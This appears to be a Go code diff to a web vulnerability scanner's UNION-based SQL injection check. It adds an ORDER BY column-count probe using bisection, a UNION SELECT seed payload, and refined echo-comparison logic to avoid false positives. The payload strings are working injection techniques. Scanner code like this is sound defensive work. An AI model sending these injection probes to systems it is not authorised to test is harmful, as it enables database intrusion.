@@ -36,6 +36,60 @@ const maxUnionColumns = 12
 // answers can be compared.
 const unionStability = 0.98
 
+// unionColumnProbe asks the database how wide the result set is.
+//
+// A UNION whose arms disagree on width is a syntax error in every database, which is what makes
+// the count discoverable rather than guessable: `ORDER BY n` is accepted for every n up to the
+// width and refused at width+1. Doubling to find the ceiling and then bisecting costs about
+// 2*log2(width) requests and reaches widths no fixed bound would — a thirteen-column result set
+// is ordinary, and the seeds alone stop at maxUnionColumns.
+//
+// Returns 0 when the boundary cannot be established, which leaves the caller to walk the seeds
+// as before.
+func unionColumnProbe(ctx context.Context, c *checks.Context, t *checks.Target) int {
+	accepted := func(n int) bool {
+		// Percent-encoded: a query string carrying a bare quote and space is refused by the
+		// transport before the database ever sees it, which reads as "the column is not
+		// there" and would make every count look like zero.
+		_, response, err := c.InjectEncoded(ctx, t,
+			t.Param.Value+"' ORDER BY "+strconv.Itoa(n)+"-- -", checks.EncodeURL)
+		if err != nil || response == nil || response.Status >= 400 {
+			return false
+		}
+		// A refused column is usually a 500, but a target that answers errors with 200 is
+		// just as common; the database's complaint quotes the number it choked on.
+		return firstNewSignature(strings.ToLower(string(response.Body)),
+			strings.ToLower(string(t.Response.Body)), sqlErrorSignatures) == ""
+	}
+
+	if !accepted(1) {
+		return 0
+	}
+	low := 1
+	high := 2
+	for high <= unionProbeCeiling && accepted(high) {
+		low = high
+		high *= 2
+	}
+	if high > unionProbeCeiling {
+		return 0
+	}
+	// The boundary sits between low (accepted) and high (refused).
+	for low+1 < high {
+		mid := (low + high) / 2
+		if accepted(mid) {
+			low = mid
+		} else {
+			high = mid
+		}
+	}
+	return low
+}
+
+// unionProbeCeiling bounds the doubling search. Wider than any result set worth filling with
+// markers.
+const unionProbeCeiling = 64
+
 // unionSeeds builds one payload per candidate column count.
 //
 // The column count has to be discovered because it cannot be guessed: a UNION
@@ -115,6 +169,32 @@ func insideTag(before string) bool {
 // returned, rather than one the page echoed back.
 func unionMarkersLanded(body, sent string) bool {
 	return len(unionMarkersInText(stripPayloadEcho(body, sent))) > 0
+}
+
+// unionMarkersExceedEcho reports whether the injected values outnumber the echo.
+//
+// The probe asked for one marker and counted how many times this page repeats it, so that count
+// is per marker: a payload carrying n markers comes back n times as many when it is only being
+// echoed. Comparing the total against `echoed*n` looks equivalent and is not — the removal of
+// the echo is not complete (a wide-byte payload comes back with U+FFFD where the byte was, which
+// the removal does not reach, and a JSON body carries the same values in several fields), so the
+// total sits somewhere between "the echo" and "the echo plus the rows". What survives both is
+// per marker: each one has to appear more often than the page repeats a marker on its own.
+func unionMarkersExceedEcho(body string, echoed int) bool {
+	markers := unionMarkersInText(body)
+	if len(markers) == 0 {
+		return false
+	}
+	counts := map[string]int{}
+	for _, marker := range markers {
+		counts[marker]++
+	}
+	for _, marker := range counts {
+		if marker > echoed {
+			return true
+		}
+	}
+	return false
 }
 
 // unionEchoed asks the page how many times it repeats a bare marker.
@@ -248,6 +328,16 @@ func unionWideByte(ctx context.Context, c *checks.Context, t *checks.Target,
 			withoutEcho = stripPayloadEcho(withoutEcho, echoed)
 		}
 		if !unionMarkersLanded(withoutEcho, echoed) {
+			continue
+		}
+		// The same control the ordinary spelling uses. A page that prints the term it was given
+		// shows the markers whether or not the statement ran, and the wide-byte spelling is the
+		// one that reaches a page whose output is JSON: the value comes back inside the echo
+		// field, with the byte that made the quote visible replaced by U+FFFD, which the removal
+		// above does not reach. Measuring what the page repeats on its own is what separates the
+		// two, and a page whose response is a struct scan dropping every UNION row — `"users":null`
+		// — would otherwise be reported as having returned them as data.
+		if echoed := unionEchoed(ctx, c, t); echoed >= 0 && !unionMarkersExceedEcho(string(response.Body), echoed) {
 			continue
 		}
 
@@ -448,7 +538,18 @@ func (sqliUnion) Run(ctx context.Context, c *checks.Context, t *checks.Target) [
 	// carrying one reads as "one row arrived" even on a page that injected
 	// nothing.
 	baselineLower := strings.ToLower(string(baseline.Body))
-	attempt, err := c.SendVariants(ctx, t, payload.SQLi, "sqli-union", unionSeeds(),
+	seeds := unionSeeds()
+	// A result set can be wider than the seeds walk, and the width is discoverable: ask for it
+	// directly rather than guessing upward. The answer goes in front, so a target that is only
+	// injectable at that width is found without walking the rest first.
+	if width := unionColumnProbe(ctx, c, t); width > 0 {
+		values := make([]string, width)
+		for i := range values {
+			values[i] = strconv.Itoa(unionMarkerBase + i)
+		}
+		seeds = append([]string{"1' UNION SELECT " + strings.Join(values, ",") + "-- -"}, seeds...)
+	}
+	attempt, err := c.SendVariants(ctx, t, payload.SQLi, "sqli-union", seeds,
 		func(_ *httpmsg.Request, resp *httpmsg.Response, variant payload.Variant) bool {
 			// A query that failed is not a query that returned rows. The database's own
 			// complaint quotes the bytes it choked on, and those bytes include the marker —
@@ -488,7 +589,7 @@ func (sqliUnion) Run(ctx context.Context, c *checks.Context, t *checks.Target) [
 	// prose, outside any tag, and those survive it. The probe asked for the bare marker, so its
 	// count is per marker — a payload carrying n markers lands n times as many when it is only
 	// being echoed, which is why the comparison is against the count scaled by n.
-	if echoed := unionEchoed(ctx, c, t); echoed >= 0 && len(landed) <= echoed*max(columns, 1) {
+	if echoed := unionEchoed(ctx, c, t); echoed >= 0 && !unionMarkersExceedEcho(string(attempt.Response.Body), echoed) {
 		return nil
 	}
 
